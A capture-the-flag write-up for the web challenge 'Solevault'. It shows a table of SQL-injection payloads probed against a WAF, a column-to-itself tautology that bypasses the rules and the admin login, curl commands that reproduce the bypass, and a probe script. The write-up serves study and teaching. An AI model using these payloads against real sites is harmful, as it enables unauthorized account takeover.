---
title: "Solevault"
category: "Web"
tags: ["sqli", "waf-bypass", "auth-bypass"]
solve_date: "2026-10-10T21:34:00+07:00"
language: "en"
points: 888
---

# Solevault

**Flag:** `kBxAc{si9n4ture_waf_b|0ck5_0n|y_7he_f4m0us_pay1oad5_sw@p_the_numb3r5_and_@ny_t4u+0l0gy_wi1l_0p3n_7he_$o1evau|+_4dm!n_con5ol3}`
**Service:** `http://sole.136.82.117.70.nip.io/` (nip.io wildcard, resolves to `136.82.117.70`)
**Points:** 936 (from the challenge card, as recorded at solve time)
**Flag format:** `kBxAc{}`

## Challenge

SoleVault is a homegrown sneaker label that just dropped its SS'26 lineup. Sleek site, slick marketing, but word on the street is the team left something valuable on an internal console, and they really trust their shiny new firewall.

## Analysis

The front page is server-rendered HTML with only two static assets (`/static/base.css`, `/static/app.js`) and one `GET /` search form taking a `q` parameter. `app.js` is pure localStorage (cart, wishlist) and issues no API calls, so every dynamic surface lives on the backend.

`/robots.txt` lists `/admin` together with two legacy paths, `/legacy-admin` and `/console`. `/admin` exists (200) and `/console` returns 404; `/legacy-admin` and the `/cart`, `/checkout`, `/account` paths from the same file were never verified. `/admin` is a login form submitting `username` and `password` back to itself, with the footer line "Protected by SoleVault Shield — malicious requests are blocked and reported to security@solevault.in".

The application and the Shield layer produce two separate, machine-readable signals:

- A wrong credential pair returns `200` with `<div class="err">Invalid username or password.</div>`; no database error is exposed.
- A blocked request returns `403` with a `403 — Request blocked` page containing:

```html
<div class="rule-chip">Rule <b>SQLI-1006</b> · Quoted string comparison</div>
<div class="req-meta">REQ-08DA-BA68 · /admin</div>
```

Because the rule ID is printed on every block, the 403 page works as a classification oracle: change one payload into another and read which signature just fired. The table below is the result of probing individual payloads through the `username` field of `POST /admin`, one request per payload, with the rule label quoted verbatim.

| Payload sent as `username=` | Result |
|---|---|
| `admin` | 200, `Invalid username or password.` |
| `admin'` | 200, `Invalid username or password.` |
| `admin\` | 200, `Invalid username or password.` |
| `admin--` | 200, `Invalid username or password.` |
| `admin'-- -` | 403 `SQLI-1007` · Quote-adjacent comment |
| `admin'#` | 403 `SQLI-1007` · Quote-adjacent comment |
| `admin' or 1=1-- -` | 403 `SQLI-1001` · Known tautology signature |
| `admin OR 1=1` | 403 `SQLI-1001` · Known tautology signature |
| `admin' or 1=1#` | 403 `SQLI-1001` · Known tautology signature |
| `admin' or not 0-- -` | 403 `SQLI-1005` · Boolean shortcut (OR/AND with literal) |
| `admin' OR username IS NOT NULL-- -` | 403 `SQLI-1005` · Boolean shortcut |
| `admin' or 'a'='a` | 403 `SQLI-1006` · Quoted string comparison |
| `admin' or 'a'<'b'-- -` | 403 `SQLI-1006` · Quoted string comparison |
| `admin SELECT` | 403 `SQLI-1002` · SQL keyword detected |
| `admin UNION` | 403 `SQLI-1002` · SQL keyword detected |
| `admin;` | 403 `SQLI-1003` · Stacked statement |
| `admin sleep(2)` | 403 `SQLI-1004` · Timing-based probe |
| `admin/*x*/` | 403 `SQLI-1009` · Inline comment / operator abuse |
| `admin\|\|1` | 403 `SQLI-1009` · Inline comment / operator abuse |
| `admin' OR username LIKE 'a%` | 403 `SQLI-1008` · Extraction / obfuscation utility |
| `admin' or 2>1-- -` | 403 `XSS-2001` · HTML delimiter |
| `admin'\tor\t2>1--\t-` | 403 `XSS-2001` · HTML delimiter |

Two constraints fall out of that table:

1. `XSS-2001` blocks `<` and `>` in the input, so any tautology built on a numeric comparison (`2>1`, `1<2`) dies before the SQL parser is reached.
2. `SQLI-1001` and `SQLI-1005` block tautologies whose **right-hand side is a literal** (`1=1`, `not 0`, `IS NOT NULL`), `SQLI-1006` blocks **quoted string comparisons** (`'1'='1`, `'a'='a`), and `SQLI-1007` blocks a comment placed immediately after the quote (`'--`, `'#`).

One tautology family matches none of those signatures: comparing **a column against itself** (`username=username`), with the comment separated from the quote by other tokens rather than sitting directly behind it. The homepage `q` parameter is irrelevant to this path: it is HTML-escaped when reflected (`'` becomes `&#39;`) and `<script>`/`<img onerror>` are stopped by `XSS-2001` at the edge.

## Solution

1. Use the 403 page as an oracle to build the rule table above, then pick the payload that matches no signature: `admin' or username=username-- -`.
2. Send it through `username`, with any `password`:

```bash
curl -sS -c jar.txt -X POST 'http://sole.136.82.117.70.nip.io/admin' \
  --data-urlencode "username=admin' or username=username-- -" \
  --data-urlencode 'password=x'
```

The application interpolates `username` straight into the WHERE clause. For a query of the form

```sql
SELECT ... FROM users WHERE username='admin' or username=username-- ' AND password='...'
```

everything after `-- ` is commented out, and `username=username` holds for rows with a non-NULL username. The condition is therefore always satisfied and the first row is returned as the authenticated identity. Because `-- -` does not sit directly behind the single quote, and because the right-hand side of the comparison is a column rather than a literal or a quoted string, the request matches neither `SQLI-1001`, `1005`, `1006` nor `1007`.

3. The response is a `302` to `/admin/panel` carrying the session cookie `sv_admin`. It is an itsdangerous/Flask-style token (`payload.signature`); the first segment base64-decodes to:

```json
{"u": "admin", "n": "Store Administrator", "r": "owner"}
```

4. `GET /admin/panel` with that cookie returns a 7.7 KB dashboard. Near the end of the page a `flag-card` block labelled "🔒 Regulatory · Compliance asset #7 · Do not share" states "This asset is referenced in the FY-26 audit binder. Only owner-role staff can view this page." and contains the flag.

## Result

```text
kBxAc{si9n4ture_waf_b|0ck5_0n|y_7he_f4m0us_pay1oad5_sw@p_the_numb3r5_and_@ny_t4u+0l0gy_wi1l_0p3n_7he_$o1evau|+_4dm!n_con5ol3}
```

The string was read directly from the `/admin/panel` HTML of a session holding the `owner` role: 125 ASCII characters, matching the `kBxAc{}` format. The flag text also describes the mechanism used here — the firewall's signatures only catch the famous payloads, and a column-to-itself comparison bypassed the tested rules. No submission response was recorded.

## Reproduce

Requires `curl` (or `python` + `requests`). These two commands reproduce the full path with no helper files:

```bash
B=http://sole.136.82.117.70.nip.io
curl -sS -c jar.txt -X POST "$B/admin" \
  --data-urlencode "username=admin' or username=username-- -" \
  --data-urlencode 'password=x'
curl -sSL -b jar.txt "$B/admin/panel" | grep -oE 'kBxAc\{[^<]*\}'
```

```text
HTTP/1.1 302 Found
location: /admin/panel
set-cookie: sv_admin=<base64(payload)>.<hmac-signature>; HttpOnly; Path=/; SameSite=Lax
```

To rebuild the rule table, save the block below as `waf_probe.py` (`pip install requests`) and run `python waf_probe.py`. The script only reads `rule-chip`, `req-meta` and `err` from each response and sends nothing else.

```python
import re, time, requests

B = "http://sole.136.82.117.70.nip.io"
RULE = re.compile(r"Rule <b>(.*?)</b> · (.*?)</div>")
ERR = re.compile(r'<div class="err">(.*?)</div>')

CASES = [
    "admin", "admin'", "admin'--", "admin--",
    "admin'-- -", "admin'#", "admin' or 1=1-- -", "admin OR 1=1",
    "admin' or 1=1#", "admin' or not 0-- -", "admin' or 'a'='a",
    "admin' or 'a'<'b'-- -", "admin SELECT", "admin UNION", "admin;",
    "admin sleep(2)", "admin/*x*/", "admin||1",
    "admin' OR username LIKE 'a%", "admin' or 2>1-- -",
    "admin' or username=username-- -",
]

s = requests.Session()
s.headers["User-Agent"] = "waf-probe"

for pl in CASES:
    r = s.post(B + "/admin", data={"username": pl, "password": "x"}, timeout=25)
    m = RULE.search(r.text)
    e = ERR.search(r.text)
    verdict = m.group(1) + " / " + m.group(2) if m else "passed"
    print("%-36s %s  %s" % (pl, r.status_code, verdict))
    if e:
        print("    app says: " + e.group(1))
    time.sleep(0.35)
```

Limits of the data above: the signatures were probed only through the `username` field of `POST /admin`, so other rules may exist that this payload set never triggered. The `owner` role comes from the broken WHERE clause, not from a real credential; nothing outside the observed responses proves how the `users` table is actually queried.
